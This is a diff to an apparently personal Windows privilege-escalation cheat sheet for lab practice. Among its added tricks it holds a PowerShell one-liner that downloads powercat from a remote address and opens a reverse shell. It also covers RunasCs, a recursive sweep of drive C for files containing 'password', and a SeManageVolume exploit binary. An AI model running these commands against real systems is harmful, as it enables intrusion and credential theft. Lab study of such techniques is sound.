@@ -2,11 +2,34 @@
 - Find all useful files when gained foothold
 - find flag pwsh: ``` Get-ChildItem -Path . -Filter local.txt -Recurse ```
 - find flag cmd: ``` dir /s local.txt ```
-- brute force password : ``` Get-ChildItem -Path C:\ -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
-    if (Test-Path -Path $_.FullName -ErrorAction SilentlyContinue) {
-        Select-String -Path $_.FullName -Pattern "password" -ErrorAction SilentlyContinue
+- 
+
+## Tricks
+1. Run As Admin or other users
+    https://github.com/antonioCoco/RunasCs 
+  ```
+    . .\RunAs.ps1
+    Invoke-RunasCs {username} {password} {cmd} 
+  ```
+
+2. PowerCat 
+   - netcat for windows
+   - https://github.com/besimorhino/powercat
+   - ``` Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.211/powercat.ps1');powercat -c 192.168.49.211 -p 5555 -e cmd ```
+
+3. Powershell color enable
+   ```
+    "$($PSStyle.Background.BrightCyan)Power$($PSStyle.Underline)$($PSStyle.Bold)Shell$($PSStyle.Reset)"
+   ```
+4. brute force password : 
+    ```
+         Get-ChildItem -Path C:\ -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+        if (Test-Path -Path $_.FullName -ErrorAction SilentlyContinue) {
+            Select-String -Path $_.FullName -Pattern "password" -ErrorAction SilentlyContinue
+        }
     }
-}```
+    ```
+
 ## Info useful
 - Usrname , hostname
 - Group memberships of current user
@@ -241,6 +264,7 @@ so it's normally easier to just look around and do basic enum
    ```
 ### SeManageVolume 
 - https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
+- ``` SeManageVolumeExploit.exe ```
 
 ### SeMachineAccountPrivilege
 - Maybe can use RBCD attack
